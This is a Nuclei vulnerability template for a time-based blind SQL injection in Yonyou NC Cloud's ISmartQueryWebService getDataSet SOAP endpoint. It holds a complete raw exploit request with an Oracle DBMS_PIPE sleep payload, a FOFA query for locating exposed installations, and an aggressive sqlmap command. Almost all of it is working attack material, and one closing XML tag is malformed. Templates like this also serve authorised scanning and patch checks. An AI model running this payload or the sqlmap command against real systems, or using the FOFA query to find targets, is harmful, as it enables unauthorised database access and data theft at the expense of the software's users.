id: yonyou-nc-cloud-getDataSet-sqli

info:
  name: 用友 NC Cloud nc.itf.smart.ISmartQueryWebService 接口 getDataSet -  sqli
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="用友-NC-Cloud"
    sqlmap: sqlmap -r sql.txt --random-agent --batch --dbms=Oracle --risk 3 --level 5
  tags: sqli,yonyou,nccloud,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /uapws/service/nc.itf.smart.ISmartQueryWebService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        SOAPAction: urn:getDataSet
        Content-Length: 716

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ism="http://smart.itf.nc/ISmartQueryWebService">
          <soapenv:Header/>
          <soapenv:Body>
              <ism:getDataSet>
                <ism:string>'||(SELECT CHR(90)||CHR(99)||CHR(71)||CHR(77) FROM DUAL WHERE 2338=2338 AND 7280=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(113)||CHR(87)||CHR(101),4))||'</ism:string>
                <ism:string1>sonoras imperio</ism:string1>
                <ism:map>
                    <ism:key>quae divum incedo</ism:key>
                    <ism:value>verrantque per auras</ism:value>
                </ism:map>
                <ism:stringarrayItem>per auras</ism:stringarrayItem>
              <ism:getDataSet>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 4 && duration < 9
        condition: and
